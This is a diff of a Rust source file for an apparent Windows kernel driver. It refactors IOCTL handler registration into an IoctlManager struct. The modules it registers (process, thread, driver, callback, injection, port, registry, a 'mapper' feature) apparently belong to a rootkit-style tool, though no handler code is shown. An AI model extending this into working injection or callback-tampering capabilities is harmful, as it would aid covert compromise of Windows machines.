@@ -1,18 +1,17 @@
 use {
     alloc::boxed::Box, 
-    hashbrown::HashMap,
-    lazy_static::lazy_static,
+    hashbrown::HashMap, 
+    shadowx::error::ShadowError, 
     wdk_sys::{IO_STACK_LOCATION, IRP, NTSTATUS},
-    crate::{
-        callback::ioctls::get_callback_ioctls, 
-        driver::ioctls::get_driver_ioctls, 
-        process::ioctls::get_process_ioctls, 
-        thread::ioctls::get_thread_ioctls,
-        registry::ioctls::get_registry_ioctls,
-        injection::ioctls::get_injection_ioctls,
-        misc::ioctls::get_misc_ioctls,
-        module::ioctls::get_module_ioctls,
-        port::ioctls::get_port_ioctls,
+    crate::modules::{
+        register_thread_ioctls,
+        register_process_ioctls,
+        register_callback_ioctls, 
+        register_driver_ioctls, 
+        register_injection_ioctls, 
+        register_misc_ioctls, 
+        register_module_ioctls, 
+        register_port_ioctls, 
     },
 };
 
@@ -24,47 +23,55 @@ use {
 ///
 /// # Arguments
 /// 
-/// - `*mut IRP`: Pointer to an IRP (I/O Request Packet), which represents an I/O request in Windows.
-/// - `*mut IO_STACK_LOCATION`: Pointer to the current I/O stack location.
-/// 
+/// * `*mut IRP` - Pointer to an IRP (I/O Request Packet), which represents an I/O request in Windows.
+/// * `*mut IO_STACK_LOCATION` - Pointer to the current I/O stack location.
 /// 
 /// # Returns
 /// 
-/// - `NTSTATUS`: A status code indicating the success or failure of the operation.
-/// 
-pub type IoctlHandler = Box<dyn Fn(*mut IRP, *mut IO_STACK_LOCATION) -> NTSTATUS + Send + Sync>;
+/// * `NTSTATUS` - A status code indicating the success or failure of the operation.
+pub type IoctlHandler = Box<dyn Fn(*mut IRP, *mut IO_STACK_LOCATION) -> Result<NTSTATUS, ShadowError> + Send + Sync>;
 
-lazy_static! {
-    /// A static map that holds the mapping of IOCTL codes to their corresponding handlers.
-    pub static ref IOCTL_MAP: HashMap<u32, IoctlHandler> = load_ioctls();
+pub struct IoctlManager {
+    handlers: HashMap<u32, IoctlHandler>,
 }
 
-/// Loads the IOCTL handlers into a `HashMap`.
-///
-/// This function collects IOCTL handlers from various modules and inserts them
-/// into a `HashMap`, which maps IOCTL codes (`u32`) to their respective handler functions (`IoctlHandler`).
-///
-/// # Returns
-/// 
-/// - `HashMap<u32, IoctlHandler>`: A map containing IOCTL handlers for process, thread, driver,
-///   callback, injection, miscellaneous, module, and port operations.
-///   If the "mapper" feature is disabled, registry-related IOCTLs are also included.
-/// 
-fn load_ioctls() -> HashMap<u32, IoctlHandler> {
-    let mut ioctls = HashMap::new();
-
-    get_process_ioctls(&mut ioctls);
-    get_thread_ioctls(&mut ioctls);
-    get_driver_ioctls(&mut ioctls);
-    get_callback_ioctls(&mut ioctls);
-    get_injection_ioctls(&mut ioctls);
-    get_misc_ioctls(&mut ioctls);
-    get_module_ioctls(&mut ioctls);
-    get_port_ioctls(&mut ioctls);
-
-    #[cfg(not(feature = "mapper"))] {
-        get_registry_ioctls(&mut ioctls);
+impl IoctlManager {
+    /// Registers a new IOCTL handler.
+    pub fn register_handler(&mut self, code: u32, handler: IoctlHandler) {
+        self.handlers.insert(code, handler);
     }
 
-    ioctls
+    /// Retrieves the IOCTL handler for the given control code.
+    pub fn get_handler(&self, control_code: u32) -> Option<&IoctlHandler> {
+        self.handlers.get(&control_code)
+    }
+
+    /// Loads the IOCTL handlers into a `HashMap`.
+    ///
+    /// This function collects IOCTL handlers from various modules and inserts them
+    /// into a `HashMap`, which maps IOCTL codes (`u32`) to their respective handler functions (`IoctlHandler`).
+    pub fn load_default_handlers(&mut self) {
+        register_process_ioctls(self);
+        register_thread_ioctls(self);
+        register_driver_ioctls(self);
+        register_callback_ioctls(self);
+        register_injection_ioctls(self);
+        register_misc_ioctls(self);
+        register_module_ioctls(self);
+        register_port_ioctls(self);
+        
+        #[cfg(not(feature = "mapper"))]
+        {
+            crate::modules::register_registry_ioctls(self);
+        }
+    }
+}
+
+impl Default for IoctlManager {
+    /// Creates a new IoctlManager with an empty handler map.
+    fn default() -> Self {
+        Self {
+            handlers: HashMap::new(),
+        }
+    }
 }
